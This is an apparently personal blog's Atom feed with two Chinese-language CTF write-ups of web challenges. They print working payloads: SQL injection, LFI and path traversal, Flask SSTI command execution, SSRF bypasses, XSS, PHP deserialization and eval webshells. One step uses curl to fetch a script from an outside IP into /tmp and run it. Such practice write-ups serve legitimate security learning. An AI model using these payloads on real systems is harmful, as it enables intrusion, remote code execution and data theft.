<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-28T06:41:39.160Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>猫猫统治世界！</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(五)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/">
        </link>
        <updated>2022-03-15T14:59:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="第一章-web入门sql注入-1">[第一章 web入门]SQL注入-1</h2>
<p>?1’#有回显，说明存在注入点(playload都要进行url编码才能上传成功)</p>
<p>?id=0' order by 3#有回显，4则没有，说明存在3个注入点</p>
<pre><code>? 0' union select 1,2,3#回显2,3，说明回显位置为2,3
</code></pre>
<p>​                  <img src="https://z0ekball.github.io/post-images/image-20220415023630705.png" alt="image-20220415023630705" loading="lazy"></p>
<pre><code>?0' union select 1,database(),3#查数据库，为note
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415023636629.png" alt="image-20220415023636629" loading="lazy"></figure>
<pre><code>?0' union select 1,table_name,3 from information_schema.tables where table_schema='note' limit 0,1#，查表名，为fl4g
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415023643225.png" alt="image-20220415023643225" loading="lazy"></figure>
<pre><code>?0' union select 1,column_name,3 from information_schema.columns where table_name='fl4g' limit 0,1#,查字列，为fllllag
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415023657483.png" alt="image-20220415023657483" loading="lazy"></figure>
<pre><code>? 0' union select 1,fllllag,3 from fl4g limit 0,1#,查字段得flag
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415023703773.png" alt="image-20220415023703773" loading="lazy"></figure>
<h2 id="第一章-web入门sql注入-2">[第一章 web入门]SQL注入-2</h2>
<p>根据提示访问login.php/?，存在盲注，</p>
<p>正确回显“error”:1,“msg”:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;</p>
<p>错误回显“error”:1,“msg”:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728</p>
<p>爆破脚本，一步一步查数据得到flag</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415023832657.png" alt="image-20220415023832657" loading="lazy"></figure>
<p>​     <img src="https://z0ekball.github.io/post-images/image-20220415023919261.png" alt="image-20220415023845927" loading="lazy"></p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415023927773.png" alt="image-20220415023927773" loading="lazy"></figure>
<h2 id="第一章-web入门afr_1">[第一章 web入门]afr_1</h2>
<p>利用<code>伪协议</code>读取flag的base64编码</p>
<pre><code>Playload: ?p=php://filter/read=convert.base64-encode/resource=flag
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415023953961.png" alt="image-20220415023953961" loading="lazy"></figure>
<p>解码得flag</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415024001374.png" alt="image-20220415024001374" loading="lazy"></figure>
<h2 id="第一章-web入门afr_2">[第一章 web入门]afr_2</h2>
<p>源码给出提示，图片在img目录下</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415024029749.png" alt="image-20220415024029749" loading="lazy"></figure>
<p>访问该目录，存在<code>目录穿越</code></p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415024036564.png" alt="image-20220415024036564" loading="lazy"></figure>
<p>访问img../，下载flag</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415024051034.png" alt="image-20220415024051034" loading="lazy"></figure>
<h2 id="第一章-web入门afr_3">[第一章 web入门]afr_3</h2>
<p>根据题目提示找到读取文件途径</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415024113151.png" alt="image-20220415024113151" loading="lazy"></figure>
<p>../../../etc/passwd<code>查看系统用户配置文件</code>，没有什么有用信息</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415024121104.png" alt="image-20220415024121104" loading="lazy"></figure>
<p>../../../proc/self/cmdline<code>查看当前进程cmdline参数</code></p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415024146591.png" alt="image-20220415024146591" loading="lazy"></figure>
<p>../../../proc/self/cwd/server.py<code>查看该程序代码</code>，存在flag.py和key.py</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415024152967.png" alt="image-20220415024152967" loading="lazy"></figure>
<p>../../../proc/self/cwd/flag.py，不允许访问</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415024202683.png" alt="image-20220415024202683" loading="lazy"></figure>
<p>../../../proc/self/cwd/key.py得到信息</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415024207877.png" alt="image-20220415024207877" loading="lazy"></figure>
<p>查看代码，意思是flag在flag.py，key.py就是flask的app.secret_key，存在<code>ssti漏洞</code>，伪造flask的session即可访问flag.py</p>
<p><code>Session</code>: session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。</p>
<p>使用flask-session-cookie-manager-master工具伪造session</p>
<h3 id="一些python魔法方式"><code>一些python魔法方式</code>：</h3>
<pre><code>__class__  返回类型所属的对象（类）

__mro__  返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。

__base__  返回该对象所继承的基类

// __base__和__mro__都是用来寻找基类的

__subclasses__  每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表

__init__ 类的初始化方法

__globals__  对包含函数全局变量的字典的引用
</code></pre>
<p>构造语句：</p>
<pre><code>{'n1code’:’{{\’\’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\’os\’].popen(\’cat flag.py\’).read()}}’}  //使用工具时，由于用到python环境，要把转义单引号
</code></pre>
<p>使用工具-s 传入key -t传入构造语句，加密得到伪造的session</p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415024408506.png" alt="image-20220415024408506" loading="lazy"></figure>
<p>上传伪造的session,得到flag</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415024417095.png" alt="image-20220415024417095" loading="lazy"></figure>
<h2 id="第二章-web进阶ssrf-training">[第二章 web进阶]SSRF Training</h2>
<p>根据题目提示找到源码，分析如下</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415024535639.png" alt="image-20220415024438584" loading="lazy"></figure>
<p>对于关键函数的测试</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415024543679.png" alt="image-20220415024543679" loading="lazy"></figure>
<p>结果如图</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415024554976.png" alt="image-20220415024554976" loading="lazy"></figure>
<p>通过构造url，能够绕过私有地址检测，从而执行else中的操作，读取flag.php</p>
<p>构造：</p>
<pre><code>url=https://a:@127.0.0.1:80@hao123.com/flag.php
</code></pre>
<p>测试</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415024730073.png" alt="image-20220415024730073" loading="lazy"></figure>
<p>上传得flag</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415024736248.png" alt="image-20220415024736248" loading="lazy"></figure>
<h2 id="第二章-web进阶死亡ping命令">[第二章 web进阶]死亡ping命令</h2>
<p>创建字典：</p>
<pre><code>&quot;~&quot;,&quot;!&quot;,&quot;@&quot;,&quot;#&quot;,&quot;$&quot;,&quot;%&quot;,&quot;^&quot;,&quot;&amp;&quot;,&quot;*&quot;,&quot;(&quot;,&quot;)&quot;,&quot;-&quot;,&quot;_&quot;,&quot;\\&quot;,&quot;[&quot;,&quot;]&quot;,&quot; ' &quot;,&quot;%0a&quot;,&quot;%0b&quot;,&quot;%0c&quot;,&quot;%0d&quot;
</code></pre>
<p>在burpsuite进行<code>fuzz测试</code>，找到回显长度不同的符号</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415024812202.png" alt="image-20220415024812202" loading="lazy"></figure>
<p>逐个测试，找到不被过滤的符号**%0a(换行符)**</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415024824780.png" alt="image-20220415024824780" loading="lazy"></figure>
<p>打开一个靶机</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415024831887.png" alt="image-20220415024831887" loading="lazy"></figure>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415024850749.png" alt="image-20220415024850749" loading="lazy"></figure>
<p>编写一个sh</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415024903714.png" alt="image-20220415024903714" loading="lazy"></figure>
<p>监听端口</p>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415024908035.png" alt="image-20220415024908035" loading="lazy"></figure>
<p>请求bash到tmp目录</p>
<pre><code>ip=127.0.0.1%0acurl 117.21.200.166/1.sh &gt; /tmp/1.sh
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/image-20220415024930358.png" alt="image-20220415024930358" loading="lazy">给bash加权限</p>
<p>给bash加权限</p>
<pre><code>ip=127.0.0.1%0achmod 777 /tmp/1.sh
</code></pre>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415025013117.png" alt="image-20220415025013117" loading="lazy"></figure>
<p>执行1.sh</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415025021543.png" alt="image-20220415025021543" loading="lazy"></figure>
<p>监听到flag n1book{6fa82809179d7f19c67259aa285a7729}</p>
<h2 id="第二章-web进阶xss闯关">[第二章 web进阶]XSS闯关</h2>
<ol>
<li></li>
</ol>
<pre><code> level1?username=&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415025107326.png" alt="image-20220415025107326" loading="lazy"></figure>
<p>2.查看源码，参数username被escape函数编码，从而过滤了通过username参数的注入  <img src="https://z0ekball.github.io/post-images/image-20220415025125677.png" alt="image-20220415025125677" loading="lazy"></p>
<p>解决办法是不用username参数注入，</p>
<p>’进行闭合，直接过滤，</p>
<p>；执行下一个语句，</p>
<p>//注释掉多余的’</p>
<pre><code>level2?username=';alert(1);//
</code></pre>
<p>得到<img src="https://z0ekball.github.io/post-images/image-20220415025158628.png" alt="image-20220415025158628" loading="lazy"></p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/mage-20220415025220165.png" alt="image-20220415025220165" loading="lazy"></figure>
<p>3.查看源码</p>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415025233594.png" alt="image-20220415025233594" loading="lazy"></figure>
<p>输入level2注入语句，可知’被注释掉了</p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415025240693.png" alt="image-20220415025240693" loading="lazy"></figure>
<p>再加一个’就能绕过，'';alert(1);//</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415025246726.png" alt="image-20220415025246726" loading="lazy"></figure>
<pre><code>level3?username='';alert(1);//
</code></pre>
<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415025310509.png" alt="image-20220415025310509" loading="lazy"></figure>
<p>4.有一个重定向的伪链接 <img src="https://z0ekball.github.io/post-images/image-20220415025358866.png" alt="image-20220415025358866" loading="lazy"></p>
<p>查看源码，get方式获取重定向链接，修改链接值即可</p>
<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415025405015.png" alt="image-20220415025405015" loading="lazy"></figure>
<pre><code>level4?jumpUrl=javascript:alert(1)
</code></pre>
<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415025424391.png" alt="image-20220415025424391" loading="lazy"></figure>
<p>5.查看源码，get方式传入参数，有两个限制</p>
<p>Autosubmit!=0且action！=0</p>
<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415025434809.png" alt="image-20220415025434809" loading="lazy"></figure>
<p>构造参数：</p>
<pre><code>?autosubmit=1&amp;action=javascript:alert(1)绕过第一个参数，执行第二个参数动作
</code></pre>
<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415025455475.png" alt="image-20220415025455475" loading="lazy"></figure>
<p>6.输入{{2*2}}回显，说明存在模板注入</p>
<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415025503046.png" alt="image-20220415025503046" loading="lazy"></figure>
<p>看源码，发现是AngularJS1.4.6版本</p>
<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415025508843.png" alt="image-20220415025508843" loading="lazy"></figure>
<pre><code>查阅对应版本模板注入，{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}直接套用
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415025533764.png" alt="image-20220415025533764" loading="lazy"></figure>
<p>得到flag<img src="https://z0ekball.github.io/post-images/image-20220415025538072.png" alt="image-20220415025538072" loading="lazy"></p>
<h2 id="第二章-web进阶文件上传">[第二章 web进阶]文件上传</h2>
<p>题目直接给出了源码，得到过滤信息：</p>
<p>1.仅允许上传zip、jpg、gif、png文件</p>
<p>2.如果上传压缩包，压缩包内不允许含有php文件</p>
<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415025600830.png" alt="image-20220415025600830" loading="lazy"></figure>
<p>上传一个含有php的zip</p>
<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415025606851.png" alt="image-20220415025606851" loading="lazy"></figure>
<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415025618302.png" alt="image-20220415025618302" loading="lazy"></figure>
<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
<p><code>010 editor</code>修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415025635449.png" alt="image-20220415025635449" loading="lazy"></figure>
<p>文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
<h3 id="apache解析漏洞"><code>Apache解析漏洞</code>：</h3>
<p>一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
<p>上传后访问，得到flag</p>
<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415025711242.png" alt="image-20220415025711242" loading="lazy"></figure>
<h2 id="第三章-web进阶python里的ssrf">[第三章 web进阶]Python里的SSRF</h2>
<p>题目给出了提示</p>
<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415025737136.png" alt="image-20220415025737136" loading="lazy"></figure>
<p>构造</p>
<pre><code>url=http://127.0.0.1:8000/api/internal/secret
127.0.0.1被禁止
</code></pre>
<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415025743538.png" alt="image-20220415025743538" loading="lazy"></figure>
<p>换成127.0.0.2，得到flag</p>
<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415025825788.png" alt="image-20220415025825788" loading="lazy"></figure>
<h3 id="绕过ip限制"><code>绕过ip限制</code>：</h3>
<pre><code>1、@绕过：

127.0.0.1和[www.baidu.com@127.0.0.1](http://www.baidu.com@127.0.0.1)解析结果一样

2、localhost或者0.0.0.0代替

3、在线转换短网址代替
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(四)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-si/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-si/">
        </link>
        <updated>2022-02-27T14:50:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2>
<p>题目给出源码</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415220438186.png" alt="image-20220415220438186" loading="lazy"></figure>
<p>传入三个参数，需要三个参数都满足条件才能获得flag</p>
<p>Text参数，需要满足(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;</p>
<p>意思为读取一个文件的内容与字符串进行强比较要相等，这里可以利用<code>伪协议data://</code>把该字符串写入一个文件，则可以绕过该比较</p>
<pre><code>Playload:text=data://doc/;base64, d2VsY29tZSB0byB0aGUgempjdGY=
</code></pre>
<p>将“welcome to the zjctf”用base64编码写入再解码保存在doc文件中，成功绕过第一个强比较</p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415220519705.png" alt="image-20220415220519705" loading="lazy"></figure>
<p>File参数，正则判断时候含有flag字符，不含flag则可以包含该文件，执行指定文件。</p>
<p>根据提示要读取useless.php文件，这里需要使用伪协议php://filter读取文件</p>
<pre><code>Playload: file=php://filter/read=convert.base64-encode/resource=useless.php
</code></pre>
<p>得到文件内容的base64编码</p>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415220545076.png" alt="image-20220415220545076" loading="lazy"></figure>
<p>解码得到一段代码</p>
<pre><code class="language-php">&lt;?php 

class Flag{ //flag.php 

  public $file; 

  public function __tostring(){ 

​    if(isset($this-&gt;file)){ 

​      echo file_get_contents($this-&gt;file); 

​      echo &quot;&lt;br&gt;&quot;;

​    return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } 

?&gt; 
</code></pre>
<p>给出一个flag类，里面有file参数，结合password参数的反序列化漏洞，可以构造password来读取flag文件</p>
<p>构造poc</p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415220614294.png" alt="image-20220415220614294" loading="lazy"></figure>
<p>得到</p>
<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
</code></pre>
<p>最终playload:</p>
<pre><code>text=data://doc/;base64,%20d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
</code></pre>
<p>页面显示</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415220641903.png" alt="image-20220415220641903" loading="lazy"></figure>
<p>抓包发送得到flag</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415220647160.png" alt="image-20220415220647160" loading="lazy"></figure>
<h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415223057971.png" alt="image-20220415223057971" loading="lazy"></figure>
<p>文件上传题目，只允许上传图片</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415223103541.png" alt="image-20220415223103541" loading="lazy"></figure>
<p>利用<code>user.ini文件</code>形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件，抓包修改文件名，文件类型</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415223118585.png" alt="image-20220415223118585" loading="lazy"></figure>
<p>上传成功</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415223143948.png" alt="image-20220415223143948" loading="lazy"></figure>
<p>再制作一个简单图马</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415223149368.png" alt="image-20220415223149368" loading="lazy"></figure>
<p>上传成功</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415223154470.png" alt="image-20220415223154470" loading="lazy"></figure>
<p>访问该文件，已被解析成php格式</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415223203729.png" alt="image-20220415223203729" loading="lazy"></figure>
<p>蚁剑连接成功</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415223209178.png" alt="image-20220415223209178" loading="lazy"></figure>
<p>打开命令行，cat /flag获得flag</p>
<h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2>
<p>题目过滤了and、=、union等sql敏感字符，采用报错注入绕过这些字符</p>
<pre><code>admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))#查库
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415223258200.png" alt="image-20220415223258200" loading="lazy"></figure>
<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#查表
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415223302459.png" alt="image-20220415223302459" loading="lazy"></figure>
<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#查列
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415223306454.png" alt="image-20220415223306454" loading="lazy"></figure>
<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#查字段，只返回了flag的前半段
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415223310304.png" alt="image-20220415223310304" loading="lazy"></figure>
<p>后面用left()right()语句查询拼接</p>
<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#
</code></pre>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415223315236.png" alt="image-20220415223315236" loading="lazy"></figure>
<p>拼起来就是flag了</p>
<h2 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h2>
<p>给出源码，要求上传参数绕过各个比较函数</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415223339993.png" alt="image-20220415223339993" loading="lazy"></figure>
<p>第一个<code>md5强比较</code>，由于md5无法处理数组，输入参数为数组时，md5函数返回false，当两个函数都是false时，强比较判断为相等。</p>
<p>第二个<code>弱比较</code>，使用1234567a，1在前，php会将其整体转成数字，则能够绕过弱比较</p>
<pre><code>Playload=id[]=1&amp;gg[]=1&amp;password=1234567a
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415223428275.png" alt="image-20220415223428275" loading="lazy"></figure>
<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
<p>简单的堆叠注入</p>
<pre><code>1’;show databases;#查库
</code></pre>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415223444015.png" alt="image-20220415223444015" loading="lazy"></figure>
<pre><code>1';show tables;#查表
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415223615185.png" alt="image-20220415223615185" loading="lazy"></figure>
<pre><code>1';show columns from `FlagHere`;#查列
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415223621635.png" alt="image-20220415223621635" loading="lazy"></figure>
<p>当输入select时，发现题目对select有严格过滤</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415223627888.png" alt="image-20220415223627888" loading="lazy"></figure>
<p>改用<code>handler</code>, handler … open语句打开一个表，使其可以使用后续handler… read语句访问，该表对象未被其他会话共享，并且在会话调用handler… close或会话终止之前不会关闭</p>
<pre><code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
</code></pre>
<p>得到flag</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415223636592.png" alt="image-20220415223636592" loading="lazy"></figure>
<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2>
<p>题目给出源代码</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415223725975.png" alt="image-20220415223725975" loading="lazy"></figure>
<p><code>remote_addr</code>和<code>x_forwarded_for</code>函数用于服务器获取IP<br>
<code>escapeshellarg()</code>和<code>escapeshellcmd()</code>一起使用时会引发解析漏洞<br>
当传入127.0.0.1参数时<br>
escapeshellarg处理后变成</p>
<pre><code>'127.0.0.1'\'' -v -d a=1'
</code></pre>
<p>escapeshellcmd处理后变成</p>
<pre><code>'127.0.0.1'\\'' -v -d a=1\'
</code></pre>
<p>最后结果是</p>
<pre><code>curl '127.0.0.1'\\'' -v -d a=1\'，\\解析为\，‘’成为空白连接符，等价于curl 127.0.0.1\ -v -d a=1，即向127.0.0.1发起post请求，数据为a=1’
</code></pre>
<p>echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</p>
<p>由于system执行命令且有host参数传参，可利用该参数传入shell</p>
<p>由于nmap的-oG命令可以把结果写入指定文件中，所以可以通过写入一句话木马的方式获得shell</p>
<pre><code>Playload= host=' &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php '
</code></pre>
<p>上传的playload经两个函数处理后变成</p>
<pre><code>''\\'' \&lt;\?php \@eval\(\$_POST\[\&quot;shell\&quot;\])\;\?\&gt; -oG test.php\'
</code></pre>
<p>上传playload之后获得文件地址</p>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415224047717.png" alt="image-20220415224047717" loading="lazy"></figure>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415224053607.png" alt="image-20220415224053607" loading="lazy"></figure>
<p>蚁剑连接</p>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415224059751.png" alt="image-20220415224059751" loading="lazy"></figure>
<p>命令行获得flag</p>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415224105531.png" alt="image-20220415224105531" loading="lazy"></figure>
<h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2>
<p>题目有有flag.php，hint.php，index.php三个页面</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415224128963.png" alt="image-20220415224128963" loading="lazy"></figure>
<p><code>Flag.php</code>页面返回ip地址值</p>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415224149959.png" alt="image-20220415224149959" loading="lazy"></figure>
<p><code>Hint.php</code>页面给出提示，暗示ip可控</p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415224155366.png" alt="image-20220415224155366" loading="lazy"></figure>
<p>抓包分析flag.php页面，发现添加一个client-ip请求头可以控制返回的ip地址</p>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415224202001.png" alt="image-20220415224202001" loading="lazy"></figure>
<pre><code>client-ip:{3*3}
</code></pre>
<p>返回9，即可以执行语句</p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415224213408.png" alt="image-20220415224213408" loading="lazy"></figure>
<pre><code>client-ip:{system(‘ls’)}
</code></pre>
<p>写入命令行，获取目录，发现flag.php文件</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415224256954.png" alt="image-20220415224256954" loading="lazy"></figure>
<pre><code>client-ip:{system('cat /flag')}
</code></pre>
<p>得到flag</p>
<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415224321493.png" alt="image-20220415224321493" loading="lazy"></figure>
<h2 id="gwctf-2019我有一个数据库">[GWCTF 2019]我有一个数据库</h2>
<p>题目没给任何提示，根据题名应该猜测数据库名称，用御剑扫描出数据库为<code>PhpMyadmin</code></p>
<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415224334182.png" alt="image-20220415224334182" loading="lazy"></figure>
<p>不需秘钥，直接登录数据库，查看版本信息</p>
<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415224349124.png" alt="image-20220415224349124" loading="lazy"></figure>
<p>根据版本信息查询相关漏洞，发现phpmyadmin4.8.0-4.8.1存在<code>文件包含漏洞</code></p>
<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415224404031.png" alt="image-20220415224404031" loading="lazy"></figure>
<p>即直接构造</p>
<pre><code>playload: target=db_datadict.php%253f/../../../../../../../../flag
</code></pre>
<p>直接读取flag</p>
<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415224423267.png" alt="image-20220415224423267" loading="lazy"></figure>
